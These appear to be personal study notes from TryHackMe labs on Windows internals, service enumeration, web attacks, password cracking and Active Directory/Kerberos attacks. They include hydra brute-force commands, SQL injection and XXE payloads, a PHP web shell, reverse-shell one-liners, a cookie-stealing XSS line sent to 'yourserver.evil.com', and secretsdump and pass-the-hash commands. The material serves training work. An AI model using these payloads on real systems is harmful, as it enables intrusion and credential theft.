              SecurityAnonymous: current user/client cannot impersonate another user/client
              SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
              SecurityImpersonation: current user/client can impersonate the client's security context on the local system
              SecurityDelegation: current user/client can impersonate the client's security context on a remote system

          where the security context is a data structure that contains users' relevant security information.

          The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

              SeImpersonatePrivilege
              SeAssignPrimaryPrivilege
              SeTcbPrivilege
              SeBackupPrivilege
              SeRestorePrivilege
              SeCreateTokenPrivilege
              SeLoadDriverPrivilege
              SeTakeOwnershipPrivilege
              SeDebugPrivilege

            It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\System\CurrentControlSet\Control\Lsa.

            The Windows Logon, winlogon.exe, is responsible for handling the Secure Attention Sequence (SAS). This is the ALT+CTRL+DELETE key combination users press to enter their username & password.

            It is also responsible for locking the screen and running the user's screensaver, among other functions.

            What is unusual?

                An actual parent process. (smss.exe calls this process and self-terminates)
                Image file path other than C:\Windows\System32
                Subtle misspellings to hide rogue process in plain sight
                Not running as SYSTEM
                Shell value in the registry other than explorer.exe

            The last process we'll look at is the Windows Explorer, explorer.exe. This is the process that gives the user access to their folders and files. It also provides functionality to other features such as the Start Menu, Taskbar, etc.

            As mentioned previously, the Winlogon process runs userinit.exe, which launches the value in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. Userinit.exe exits after spawning explorer.exe. Because of this, the parent process is non-existent.

            What is unusual?

                An actual parent process. (userinit.exe calls this process and exits)
                Image file path other than C:\Windows
                Running as an unknown user
                Subtle misspellings to hide rogue process in plain sight
                Outbound TCP/IP connections


Network services
    SMB
        enum4linux
        -U             get userlist
        -M             get machine list
        -N             get namelist dump (different from -U and-M)
        -S             get sharelist
        -P             get password policy information
        -G             get group and member list
        -a             all of the above (full basic enumeration)
        -I             get about LDAP running on the server
        -i             printer information
        -n             nbmlookup

    smbclient
        -L list of shares  Ex: smbclient -L //10.10.0.50/ -U '' -N
        -U Username
        -P
        once inside:
        mput : Upload
            recurse to upload a specified folder ant its contents recursive
        mget: Download
    rpcclient 
      -U "" 10.10.32.51 -N  -c 'enumdomusers'
    telnet
        sudo tcpdump ip proto \\icmp -i tun0
        msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
    ftp
        hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

    SMTP
        msfconsole
            use 0
            options
            run
        hydra -t 16 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.230.202 ssh

    MySQL
        sudo apt install default-mysql-client
        mysql -h [IP] -u [username] -p
        msfconsole >> mysql_sql | mysql_schemadump | mysql_hashdump

cURL
    -X: Request type, eg -X POST
    --data: Which will default to plain text data.
    It does not store cookies and you have to manually specify any cookies and values that you would like to send with your request.
    Cookies are not shared between different browsers.
    curl -c - http://10.10.223.233:8081/ctf/getcookie : To see the cookie that you received
    curl -v --cookie "flagpls=flagpls" http://10.10.223.233:8081/ctf/sendcookie


SQLi
    https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt
    https://gchq.github.io/CyberChef/
    FlagAuthorised:True
    GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" : about/0 es para no retornar nada legitimo. group_concat es para recoger todos los elementos.
BURP
    <script>alert("Succ3ssful XSS")</script> : To probe an alert in JS
    Intruder: This quality makes Sniper very good for single-position attacks (e.g. a password bruteforce if we know the username or fuzzing for API endpoints).
    Battering Ram: Each item in our list of payloads gets put into every position for each request.
    Pitchfork: Pitchfork uses one payload set per position (up to a maximum of 20) and iterates through them all at once. If we have two lists, one with 100 lines and one with 90 lines, Intruder will only make 90 requests, and the final ten items in the first list will not get tested.


OWASP 10
    1-Injection:
        nc -e /bin/bash
        Linux
            whoami
            id
            ifconfig/ip addr
            uname -a
            ps -ef
            /etc/os-release or lsb_release -a

        Windows
            whoami
            ver
            ipconfig
            tasklist
            netstat -an
    2-Broken authentication
        register a user in a login page with some little changes like " darren" instead of "darren" who exists to gain the same privileges

    3-Sensitive Data Exposure
	sqlite3 to query a flat-file database
            .tables
            PRAGMA table_info(customers); //to see the table informatio

    4-XML External Entity
        Examples of XXE payload
            <!DOCTYPE replace [<!ENTITY name "feast"> ]>
             <userInfo>
              <firstName>falcon</firstName>
              <lastName>&name;</lastName>
             </userInfo>

            <?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
            <root>&read;</root>

    5-Broken Access Control
    6-Security Misconfiguration
    7-Cross-site Scripting
        Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
        Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
<!DOCTYPE html>
<html>
<head>
<title>This is the page title</title>
</head>
<body>
<h1>This is a Heading</h1>
<p>This is a paragraph.</p>
</body>
</html>
        XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
        Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).

        <script>alert(window.location.hostname)</script>
        <script>document.querySelector('#thm-title').textContent = 'Hey'</script>
        #Exercise: <script>document.location='/log/'+document.cookie</script>
                   <img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '"
    There are three major types of XSS attacks:
      DOM (Special)
              DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
                <iframe src="javascript:alert(`xss`)">
      Persistent (Server-side)
              Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. 
              Once request captured, add a new header like this. True-Client-IP: <iframe src="javascript:alert(`xss`)">
      Reflected (Client-side)
              Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.



    To disable the browser built-in XSS protection
      Go to the URL bar, type about:config
      Search for browser.urlbar.filter.javascript
      Change the boolean value from True to False

    8- Insecure deserialization
    9-Components with known vulnerabilities
    10-Insufficient logging and monitoring
=============================================
Room: OwaspJuiceShop

1. SQLi
  {"email":"' or 1=1--","password":"no"}
  Why does this work?

      1.The character ' will close the brackets in the SQL query
      2.'OR' in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account. The 1=1 can be used when the email or username is not known or invalid
      3.The -- character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively

  {"email":"bender@juice-sh.op'--","password":"a"}

2. Broken Authentication
The § § is not two sperate inputs but rather Burp's implementation of quotations e.g. ""
hydra
  hydra -t 4 -l admin@juice-sh.op -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 10.10.223.38 http-post-form "/#/login:password=^PASS^=yes&login=Log+In&proc_login=true:Invalid email or password."

#Another use of hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -f 10.10.82.175 -s 8080 http-get /manager/html #Not worked
hydra -l jan -t 4 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.55.243

Consider the following concrete examples:

    hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
    hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.186.248 is identical to the previous example. 10.10.186.248 ftp is the same as ftp://10.10.186.248.
    hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
    hydra -l <username> -P <wordlist> 10.10.22.33 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    hydra -t 4 -I -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.22.33 http-post-form "/login/:username=molly&password=^PASS^:Your username or password is incorrect."
    hydra -L usernames -P passwords 192.208.137.3 http-post-form
"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
credentials or user not activated!"

There are some extra optional arguments that you can add:

    -s PORT to specify a non-default port for the service in question.
    -V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
    -t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
    -d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.


3. Poison Null Byte
Example: http://10.10.181.162/ftp/package.json.bak >> http://10.10.181.162/ftp/package.json.bak%2500.md  ||| URL encoding

==============================================
Room: Upload vulnerabilities

hosts file do and undo:
  Linux and MacOS ==> /etc/hosts
  sudo sed -i '$d' /etc/hosts

  Windows ==> C:\Windows\System32\drivers\etc\hosts
  (GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts

Overwriting existing files
  Uploading a different file with same name
RCE
  web shell
    <?php echo system($_GET["cmd"]);?>
    <?php system("whoami")?>
    wfuzz --hc=404 -c -t 200 -u http://overwrite.uploadvulns.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    gobuster -x php,txt,html
    After that, go to http://shell.uploadvulns.thm/resources/malicious.php?cmd=id;ls;whoami
  reverse shell
    https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    nc -lvnp 4126
    After that, go to http://shell.uploadvulns.thm/resources/malicious.php

Filtering
  Extension validation
    MS Windows still uses them to identify file types
    Unix use magic numbers
  File type filtering
    MIME validation
      (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request with the format <type>/<subtype>
        Content-Type: image/jpeg
    Magic number validation
  FIle length
  file name     
    "bad characters"
  file content

  Bypassing client-side filtering
    Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
    
    Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below. It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|:
      Example: Refresh page and do intercept > response to this request with burp. Eliminate or comment unwanted function. Forward.

    Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
        Example with a legitimate extension: Intercept when uploading the message and changing extension and MIME

    Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command

  BYpassing server-side filtering: 
    File extensions
      Another example would be testing which is a valid extension and upload other file with 2 extensions. Valid: dog.jpg | Not valid malicious.php | Valid to access: malicious.jpg.php or malicious.jpg.php5

    Magic numbers
      Using hexeditor to check first 8 hex characters and file 
      We could use vim with :%!xxd. To save changes :%!xxd -r
====================
Hashing 

    You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.

    This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password? This means you never have to store the user's password, and if your database was leaked then an attacker would have to crack each password to find out what the password was. That sounds fairly useful.

    There's just one problem with this. What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. That means if someone cracks that hash, they get into more than one account. It also means that someone can create a "Rainbow table" to break the hashes.

    A rainbow table is a lookup table of hashes to plaintexts, so you can quickly find out what password a user had just from the hash. A rainbow table trades time taken to crack a hash for hard disk space, but they do take time to create.


    To protect against rainbow tables, we add a salt to the passwords. The salt is randomly generated and stored in the database, unique to each user. In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created specific passwords with that salt.

    The salt is added to either the start or the end of the password before it’s hashed, and this means that every user will have a different password hash even if they have the same password. Hash functions like bcrypt and sha512crypt handle this automatically. Salts don’t need to be kept private.



    Unix style password hashes are very easy to recognise, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash. The standard format is$format$rounds$salt$hash.

    Windows passwords are hashed using NTLM, which is a variant of md4. They're visually identical to md4 and md5 hashes, so it's very important to use context to work out the hash type.

    On Linux, password hashes are stored in /etc/shadow. This file is normally only readable by root. They used to be stored in /etc/passwd, and were readable by everyone.

    On Windows, password hashes are stored in the SAM. Windows tries to prevent normal users from dumping them, but tools like mimikatz exist for this. Importantly, the hashes found there are split into NT hashes and LM hashes.


============================
John the ripper

john --format=[format] --wordlist=[path]

  A Note on Formats:
    When you are telling john to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF "md5".

NTHash / NTLM

  NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".

  A little bit of history, the NT designation for Windows products originally meant "New Technology", and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the "NT" line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. 

  You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy

Unshadowing
  unshadow [path to passwd] [path to shadow]
  unshadow - Invokes the unshadow tool
  [path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
  [path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 

Using single crack mode
  john --single --format=[format] [path to file]

  A Note on File Formats in Single Crack Mode:
    If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt
    From:
    1efee03cdcb96d90ad48ccc7b8666033
    To
    mike:1efee03cdcb96d90ad48ccc7b8666033


How to create Custom Rules

  Custom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.

  Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.

  The first line:
  [List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.
  We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
  Az - Takes the word and appends it with the characters you define
  A0 - Takes the word and prepends it with the characters you define
  c - Capitalises the character positionally

  These can be used in combination to define where and what in the word you want to modify.

  Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes " ". Here are some common examples:

  https://campus.barracuda.com/product/campus/doc/5472273/regular-expressions
  [0-9] - Will include numbers 0-9
  [0] - Will include only the number 0
  [A-z] - Will include both upper and lowercase
  [A-Z] - Will include only uppercase letters
  [a-z] - Will include only lowercase letters
  [a] - Will include only a
  [!£$%@] - Will include the symbols !£$%@


  Putting this all together, in order to generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:
  [List.Rules:PoloPassword]
  cAz"[0-9] [!£$%@]"

  In order to:
    Capitalise the first  letter - c
    Append to the end of the word - Az
    A number in the range 0-9 - [0-9]
    Followed by a symbol that is one of [!£$%@]
  
  Using Custom Rules
  We could then call this custom rule as a John argument using the  --rule=PoloPassword flag.
  As a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
  As a note I find it helpful to talk out the patterns if you're writing a rule- as shown above, the same applies to writing RegEx patterns too.

  Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn't working properly.
-=-=-=-=-

Cracking password protected zip file
Zip2John

  Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:
  zip2john [options] [zip file] > [output file]
  [options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
  [zip file] - The path to the zip file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    zip2john zipfile.zip > zip_hash.txt
-=-=-=-=
Cracking a password protected RAR archive
Rar2John

  Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:
  rar2john [rar file] > [output file]
  rar2john - Invokes the rar2john tool
  [rar file] - The path to the rar file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    rar2john rarfile.rar > rar_hash.txt

--=-=-=-=-
Cracking SSH key passwords

  Note that if you don't have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you're doing this, replace the ssh2john command with python3 /opt/ssh2john.py or on Kali, python /usr/share/john/ssh2john.py.

  ssh2john [id_rsa private key file] > [output file]

  ssh2john - Invokes the ssh2john tool

  [id_rsa private key file] - The path to the id_rsa file you wish to get the hash of

  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from 

=====================================================
Encryption - Crypto 101

  Passphrase - Separate to the key, a passphrase is similar to a password and used to protect a key.

DO NOT encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plaintext, and you should use hashing to manage them safely.
An important thing to remember about modulo is that it’s not reversible. If I gave you an equation: x % 5 = 4, there are infinite values of x that will be valid.

The two main categories of Encryption are symmetric and asymmetric.

  Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long).

  Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.

=-=-=-=-=
The math(s) side

  RSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).
  The attacking side

  The maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.

  There are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is https://github.com/Ganapati/RsaCtfTool which has worked very well for me. I’ve also had some success with https://github.com/ius/rsatool.

  The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

  “p” and “q” are large prime numbers, “n” is the product of p and q.

  The public key is n and e, the private key is n and d.

  “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

-=-=-=-=-=-
SSH authentication
ssh-keygen
  It’s very important to mention that the passphrase to decrypt the key isn’t used to identify you to the server at all, all it does is decrypt the SSH key. The passphrase is never transmitted, and never leaves your system.

ssh -i [keyNameGoesHere] user@host

gpg2john

=======================================
Basics of AD 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

    Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
    Stored by default in %SystemRoot%\NTDS
    accessible only by the domain controller

A forest consists of these parts:
  Trees - A hierarchy of domains in Active Directory Domain Services
  Domains - Used to group and manage objects 
  Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
  Trusts - Allows users to access resources in other domains
  Objects - users, groups, printers, computers, shares
  Domain Services - DNS Server, LLMNR, IPv6
  Domain Schema - Rules for object creation

The four types of users are: 
  Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
  Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
  Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
  Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization

Active Directory groups: 

    Security Groups - These groups are used to specify permissions for a large number of users
    Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

Default Security Groups - 

  There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

    Domain Controllers - All domain controllers in the domain
    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise
    Schema Admins - Designated administrators of the schema
    DNS Admins - DNS Administrators Group
    DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    Group Policy Creator Owners - Members in this group can modify group policy for the domain
    Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Cert Publishers - Members of this group are permitted to publish certificates to the directory
    Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    RAS and IAS Servers - Servers in this group can access remote access properties of users

-=-=-=-=-=
Trusts & policies
In some environments trusts can be extended out to external domains and even forests in some cases.

The two types of trusts below: 

    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Domain Policies Overview - 

  Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender

-=-=-=-=-=
Outlined below are the default domain services: 

    LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
    Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
    DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

Domain authentication overview
    Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
    NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

-=-=-=-=-=-=
AD Cloud


Windows Server AD	Azure AD
LDAP	                Rest APIs
NTLM	                OAuth/SAML
Kerberos	        OpenID
OU Tree	                Flat Structure
Domains and Forests	Tenants
Trusts	                Guests
--=-=-=-=-=
AD commands

Get-NetComputer -fulldata | select operatingsystem #gets a list of all operating systems on the domain
Get-NetUser | select cn #gets a list of all users on the domain
Get-ADUser -identity SQLService -properties * # Check properties
(get-wmiobject -class win32_computersystem).partofdomain

-=-=-=-=-=-=
AD attacks
Tools needed
  impacket
  bloodhound
  neo4j

With Kerberos we can use Kerbrute
kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

GetNPUsers.py spookysec.local/ -usersfile after_kerbrute.txt -format john -output results.txt

smbclient -U "svc-admin" \\\\10.10.134.44\\backup

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

secretsdump.py spookysec.local/backup:backup2517860@10.10.248.76 -outputfile results_secretsdump.txt

evil-winrm -i 10.10.248.76 -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc'

--=-=-=--=-=-=
What is Kerberos?
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.


Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail - 
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents - 
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

    Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
    User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access 

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required
---===--===-==

Enumeration w/Kerbrute
You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.55.165  CONTROLLER.local    

Abusing Pre-Authentication Overview -

